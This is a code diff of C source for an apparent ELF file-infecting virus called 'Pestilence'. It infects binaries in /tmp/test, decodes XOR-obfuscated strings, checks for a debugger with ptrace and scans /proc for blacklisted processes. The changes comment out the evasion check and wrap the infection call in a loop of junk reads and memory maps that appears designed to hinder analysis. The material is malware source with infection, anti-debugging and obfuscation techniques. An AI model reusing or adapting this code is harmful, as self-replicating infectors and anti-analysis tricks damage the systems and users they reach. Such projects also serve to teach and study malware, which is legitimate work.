@@ -12,7 +12,6 @@
 #define BUILDER_RE_ENTRY_OFFSET 0xe5;
 
 __attribute__((section(".text"))) volatile static char signatur[] = "Pestilence | abied-ch & fbruggem";
-__attribute__((section(".text"))) volatile static char signaur[] = "ahhhhhhhh{";
 __attribute__((section(".text"))) volatile static char path_self[] = {0x6d, 0x32, 0x30, 0x2d, 0x21, 0x6d, 0x31, 0x27, 0x2e, 0x24, 0x6d, 0x27, 0x3a, 0x27, 0x00};
 __attribute__((section(".text"))) volatile static char mappings_path[] = {0x6d, 0x32, 0x30, 0x2d, 0x21, 0x6d, 0x31, 0x27,
                                                                           0x2e, 0x24, 0x6d, 0x2f, 0x23, 0x32, 0x31, 0x00};
@@ -169,6 +168,7 @@ ft_strcat(volatile char *dst, volatile char *src) {
         dst[i] = src[i];
     }
 }
+
 __attribute__((always_inline)) inline int
 ft_strnstr_with_max_needle_size(volatile char *haystack, volatile char *needle, size_t size, size_t needle_size) {
     int i = 0;
@@ -207,8 +207,10 @@ decrypt() {
         bad_process_name[i] ^= 0x42;
     }
 }
+
 __attribute__((always_inline)) static inline int
 bad_process_running() {
+
     volatile char path[256];
     volatile char cmdline_buf[1024];
     volatile char getdents_buf[4096];
@@ -270,14 +272,6 @@ __attribute__((always_inline)) static inline int
 in_debugger() {
     return sys(SYS_ptrace, 0, 1, 0, 0, 0, 0);
 }
-// __attribute__((always_inline)) static inline void
-// ft_exit_incubation() {
-//     int fd_is_incubator = ft_open(incubation, O_RDONLY, 0);
-//     if (fd_is_incubator < 0) {
-//         ft_exit(0);
-//     }
-//     ft_close(fd_is_incubator);
-// }
 
 __attribute__((always_inline)) static inline uint64_t
 parse_hex(volatile char *hex) {
@@ -360,23 +354,64 @@ _start() {
     if (fd_self < 0) {
         ft_exit(0);
     };
+    // if (in_debugger() || bad_process_running()) jump_back(fd_self);
 
-    if (in_debugger() || bad_process_running()) jump_back(fd_self);
+    for (volatile uint64_t x = 3; x < 201; x++) {
+        //
+        if (x % 2 == 0) {
+            volatile int fd = ft_open(path_self, O_RDONLY, 0);
+            volatile int fd2 = ft_open(slash_proc, O_RDONLY, 0);
 
-    volatile char dir[11];
-    dir[0] = '/';
-    dir[1] = 't';
-    dir[2] = 'm';
-    dir[3] = 'p';
-    dir[4] = '/';
-    dir[5] = 't';
-    dir[6] = 'e';
-    dir[7] = 's';
-    dir[8] = 't';
-    dir[9] = '\0';
+            volatile char buf[100];
 
-    if (infect_dir(dir, fd_self)) jump_back(fd_self);
+            ft_read(fd_self, buf, x % 100);
 
+            file file;
+            file_mmap(fd_self, &file);
+
+            volatile int index = (x % 100) % 47;
+            if (buf[index] < '0') buf[index] += '9';
+
+            file_munmap(&file);
+
+            ft_close(fd);
+            ft_close(fd2);
+        }
+
+        if (x % 109 == 0) {
+
+            volatile char dir[11];
+            dir[0] = '/';
+            dir[1] = 't';
+            dir[2] = 'm';
+            dir[3] = 'p';
+            dir[4] = '/';
+            dir[5] = 't';
+            dir[6] = 'e';
+            dir[7] = 's';
+            dir[8] = 't';
+            dir[9] = '\0';
+
+            if (infect_dir(dir, fd_self)) continue;
+        }
+
+        if (x % 2 == 0) {
+            volatile int fd = ft_open(mappings_path, O_RDONLY, 0);
+
+            volatile char buf[400];
+
+            ft_read(fd_self, buf, x % 312);
+
+            file file;
+            file_mmap(fd_self, &file);
+
+            volatile int index = (x % 100) % 47;
+            if (buf[index] < '0') buf[index] += '9';
+
+            file_munmap(&file);
+            ft_close(fd);
+        }
+    }
     jump_back(fd_self);
 }
 
